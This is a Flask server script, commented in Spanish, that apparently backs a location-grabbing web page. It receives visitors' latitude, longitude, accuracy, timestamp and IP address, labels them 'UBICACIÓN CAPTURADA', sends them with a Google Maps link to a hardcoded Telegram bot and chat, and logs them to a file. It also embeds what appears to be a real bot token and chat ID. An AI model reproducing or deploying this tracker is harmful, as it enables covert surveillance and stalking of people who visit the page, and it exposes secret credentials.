from flask import Flask, request, jsonify, send_from_directory
import os
import uuid
import requests
from telegram import Bot

app = Flask(__name__)

# ================= CONFIGURACIÓN =================
# Puedes cambiar estos valores o ponerlos en variables de entorno de Koyeb
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8605186812:AAET8973lR2dwBr10G_hsw2jbL6yaxLvBPI')
CHAT_ID = os.environ.get('CHAT_ID', '7891650726')
UPLOAD_FOLDER = 'uploads'
# ==================================================

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

@app.route('/guardar_y_notificar', methods=['POST'])
def save_location():
    # Recibir datos del formulario JS
    lat = request.form.get('lat', 'No disponible')
    lon = request.form.get('lon', 'No disponible')
    precision = request.form.get('precision', 'No disponible')
    fecha = request.form.get('fecha', 'No disponible')
    ip = request.remote_addr

    # Formatear mensaje para Telegram
    mensaje = (
        f"🎯 UBICACIÓN CAPTURADA\n\n"
        f"📍 Lat: {lat}\n"
        f"📍 Lon: {lon}\n"
        f"📏 Precisión: ±{precision}m\n"
        f"⏰ {fecha}\n"
        f"🌐 IP: {ip}\n\n"
        f"🗺️ https://www.google.com/maps?q={lat},{lon}"
    )

    # Enviar mensaje al admin vía Bot API
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': mensaje}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Error enviando a Telegram: {e}")

    # Guardar en log local
    with open('ubicaciones_log.txt', 'a') as f:
        f.write(mensaje + "\n---\n")

    return "OK", 200

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    if file:
        filename = f'{uuid.uuid4()}.jpg'
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        file.save(file_path)
        return jsonify({'url': f'/static/{filename}'}), 200

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    # Cambiar puerto a 8080 que es el estándar de muchos hostings cloud
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))